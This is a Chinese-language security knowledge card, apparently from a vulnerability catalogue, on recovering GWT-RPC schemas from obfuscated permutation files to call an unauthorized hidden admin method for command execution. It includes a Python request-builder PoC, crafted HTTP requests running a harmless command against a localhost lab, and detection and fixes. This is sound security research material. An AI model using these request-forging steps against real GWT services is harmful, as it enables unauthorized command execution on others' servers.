---
id: web-java-framework-gwt-rpc-hidden-method-authz-rce
title: GWT-RPC 隐藏服务方法可达导致未授权命令执行
type: scenario
domain: web
path: web/java/framework
technique: gwt-rpc-schema-recovery-hidden-method-rce
aliases:
- GWT-RPC 隐藏方法调用
- GWT-RPC Schema 恢复
- Shadow Request 重构
- GWTMap 失效
- GWT permutation 逆向
tags:
- java
- gwt
- gwt-rpc
- reverse
- obfuscation
- authz
- hidden-method
- rce
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-04'
verification:
  verified_by: verifier-V2
  verified_at: '2026-11-04T21:41:04+08:00'
  notes: 已对照原文与 18 张截图核对：GWT-RPC v7 token 流与索引、GWTMap 失效原因(d.b→this.b→'login')、Shadow Request/Inlet-Egress 重构、string table 去重与转义、round-trip、隐藏 AdminService.runCommand 实际执行 open -a Calculator、Task 字段按字母序(command 先)、strongName 缺失回退 Legacy 但不等同 RCE，均与原文一致。卡片 HTTP 示例中 X-GWT-Permutation 字符串比截图少 '9A'，属示例笔误，不影响结论。affected_versions 留空恰当（GWT 2.10.0 仅为实验环境）。PoC 未独立执行。
---

## 一句话结论

GWT 前端混淆只会压缩标识符，RPC 组包所需的 service、method、类型签名仍保留在 permutation（`*.cache.js`）里；据此恢复 Schema 并重构合法的 GWT-RPC 请求后，可调用页面没有入口、但 servlet 仍注册的隐藏服务方法，若该方法缺少方法级授权且内部存在危险操作，即可直接命令执行。

## 原理

- GWT 将 Java 编译为 JavaScript。函数名、局部变量可以被压成短名，但 RPC 运行时在组包时必须知道服务接口、方法名和 Java 类型签名，这些语义字符串不会因标识符混淆而消失，通常仍以字面量或对象字段形式留在当前 permutation 中。
- GWT-RPC v7 报文是 `|` 分隔的 token 流：
  - `version | flags | 字符串表长度 | 字符串表... | baseUrl 索引 | strongName 索引 | service 索引 | method 索引 | 参数数量 | 类型索引... | 值索引... |`；
  - 所有索引从 1 开始，指向字符串表；字符串表需要去重，值若与方法名、类型签名或 baseUrl 相同应复用已有索引；
  - 字符串中的 `|` 转义为 `\!`，反斜杠转义为 `\\`；回写时长度、索引、转义必须整体重算。
- 现有工具 GWTMap 在当前 GWT 2.10.0 样本上恢复失败，原因是它依赖固定行偏移、固定调用位置和单行单跳变量查找；实际样本把方法名拆成 `d.b → this.b → 'login'` 这类跨对象字段/全局变量的间接关系，单层回溯找不到。
- 可靠做法是从 RPC 组包调用作为 sink 反向追数据流：服务名是直接字面量；方法名追到代理对象字段；类型签名是重复写入的变量；参数数量由单独调用给出。无需先还原每个短函数的原名。
- 服务端错误可用于动态校验 Schema：修改类型签名会返回 `Could not locate requested method 'login(java.lang.Integer, java.lang.String)'`，修改方法名或服务接口会分别泄漏签名和实现类。错误回显是反馈信号，不是授权控制。
- 隐藏服务：前端 EntryPoint 没有调用、页面没有按钮，并不等于 servlet 不可达。只要 `web.xml` 仍把 `AdminServiceImpl` 映射到 `/gwtlab/admin`，且方法级授权缺失，攻击者就能直接构造请求调用 `runCommand`。
- 复杂对象还有字段顺序问题：GWT 2.10.0 的 `SerializabilityUtil` 用 `Arrays.sort(..., FIELD_COMPARATOR)` 按字段名字母序序列化，而不是按 Java 源码声明顺序。`Task` 中 `command` 排在 `name` 前，payload 必须先写 `command` 的值。
- `strongName` 只是定位当前 permutation 对应 `.gwt.rpc` 序列化策略文件的标识，不是身份凭证。策略文件缺失时，GWT 2.10.0 默认回退到 `LegacySerializationPolicy` 继续解码，而不是 fail-close；但这条回退本身不等于 RCE，最终危害仍取决于可达方法与可实例化类型，不能与“隐藏方法无授权”混为一谈。

## 触发条件

- 目标使用 GWT-RPC，且当前 permutation 的 `*.cache.js` 或相关编译产物可被访问/已泄漏。
- 存在 GWT `RemoteServiceServlet` 端点，且前端未暴露但 servlet 仍注册的服务/方法。
- 服务端没有在方法调用前做真正的权限判断，只依赖前端是否显示按钮。
- 被隐藏的方法内部存在危险操作（如直接 `Runtime.getRuntime().exec()`、文件操作、管理接口调用）。
- 复杂对象参数需要当前 permutation 的序列化策略或可用的 Legacy 回退；仅字符串/数值参数的调用门槛更低。

## 利用步骤

1. 抓取一条正常 GWT-RPC 请求，记录 `X-GWT-Permutation`、`X-GWT-Module-Base`、请求路径与 body。
2. 按 `|` 拆分 body，解析版本、字符串表、元数据索引、类型索引和值索引；先把请求转成可读的 Shadow Request（JSON）以确认解析正确。
3. 在浏览器实际加载的 permutation（`*.cache.js`）中搜索服务名、方法名和类型签名字符串；确认它们确实存在。
4. 若 GWTMap 等工具返回 0 个服务/方法，改为手工追数据流：定位 RPC 组包调用，分别追服务字面量、方法字段、类型变量和参数数量。
5. 用服务端错误动态校验：替换类型签名、方法名或服务接口，观察错误中的方法签名/接口名，校准恢复出的 Schema。
6. 重新编码请求：重建字符串表、去重、计算从 1 开始的索引、转义 `|` 与 `\`；先做不修改业务字段的 round-trip，确保回写报文与服务端接受。
7. 枚举 `/gwtlab/` 下仍注册的 servlet 路径，恢复隐藏服务的 Schema，构造对应 Shadow Request 并发送。
8. 对复杂对象按 GWT 的字段名字母序写入字段值，再调用目标方法。

## PoC

最小 GWT-RPC 组包/回写函数（String 参数）：

```python
def gwt_rpc(service, method, types, values, base, strong):
    table, idx = [], {}
    def add(s):
        s = str(s)
        if s not in idx:
            table.append(s)
            idx[s] = len(table)
        return idx[s]
    def esc(s):
        return str(s).replace("\\", "\\\\").replace("|", "\\!")
    b, sn = add(base), add(strong)
    sv, m = add(service), add(method)
    ti = [add(t) for t in types]
    vi = [add(v) for v in values]
    parts = ["7", "0", str(len(table))] + [esc(x) for x in table]
    parts += [str(b), str(sn), str(sv), str(m), str(len(types))]
    parts += [str(x) for x in ti] + [str(x) for x in vi]
    return "|".join(parts) + "|"

body = gwt_rpc(
    "com.example.client.AdminService", "runCommand",
    ["java.lang.String/2004016611"], ["open -a Calculator"],
    "http://127.0.0.1:8088/gwtlab/", "5673EE239E1CAE627B9A203C33398A18",
)
print(body)
```

生成的隐藏方法调用请求：

```http
POST /gwtlab/admin HTTP/1.1
Host: 127.0.0.1:8088
Content-Type: text/x-gwt-rpc; charset=UTF-8
X-GWT-Permutation: F26CD9C49C19836F75F29E33F2593B
X-GWT-Module-Base: http://127.0.0.1:8088/gwtlab/

7|0|6|http://127.0.0.1:8088/gwtlab/|5673EE239E1CAE627B9A203C33398A18|com.example.client.AdminService|runCommand|java.lang.String/2004016611|open -a Calculator|1|2|3|4|1|5|6|
```

服务端返回：

```text
//OK[1,["executed: open -a Calculator"],0,7]
```

复杂对象 `Task(name, command)` 的字段按字母序写入（`command` 在前）：

```text
7|0|7|http://127.0.0.1:8088/gwtlab/|5673EE239E1CAE627B9A203C33398A18|com.example.client.AdminService|processTask|com.example.shared.Task/62376796|open -a Calculator|system|1|2|3|4|1|5|5|6|7|
```

## 变体与关联

- 变体：GWTMap 失效后，可用自写的 permutation 解析器或手工数据流恢复；工具失败不代表 RPC 信息不存在。
- 变体：`strongName` 指向的 `.gwt.rpc` 不存在时，GWT 2.10.0 回退 `LegacySerializationPolicy` 继续解码；这是策略加载未 fail-close 的弱点，但原文明确不能单独推出 RCE，需结合可达危险方法。
- 变体：复杂对象字段按字母序而非源码顺序，字段顺序错误会表现为反序列化异常或字段值错位，而不是直接拒绝。
- 变体：除 AdminService 外，任何仍注册但前端未引用的 `RemoteServiceServlet` 都应按同样方式枚举。
- 关联：Java 反序列化目录下的 gadget 链解决“能实例化什么”，本卡解决“能调用哪个方法、如何构造合法 GWT-RPC 请求”。

## 检测与防御

- 修复：每个 RPC 方法在进入业务逻辑前做方法级授权，不能依赖前端是否展示入口；管理 servlet 单独做认证与角色校验。
- 修复：移除或禁用前端不需要的 servlet 映射与服务实现；不要在生产包中保留调试/管理用危险方法。
- 修复：序列化策略文件缺失、读取失败或解析失败时 fail-close，在反序列化前终止请求，不回退到默认 Legacy 策略；校验 `strongName` 是否对应当前模块的真实策略。
- 加固：对 GWT-RPC 请求做类型白名单，未登记类型在实例化前拒绝；限制可调用方法与参数类型。
- 加固：移除 `Runtime.exec`、文件操作等危险方法，管理功能改走独立鉴权通道并记录审计日志。
- 检测：异常 GWT-RPC 请求中出现非预期 service/method/type 组合、全零或不存在的 strongName、`Could not locate requested method` 大量探测；关注 `/gwtlab/admin` 等前端未引用的 servlet 路径。
- 检测：对比前端 permutation 中出现的服务/方法与服务端实际注册的 servlet 映射，发现“前端不可见但服务端可达”的差异。
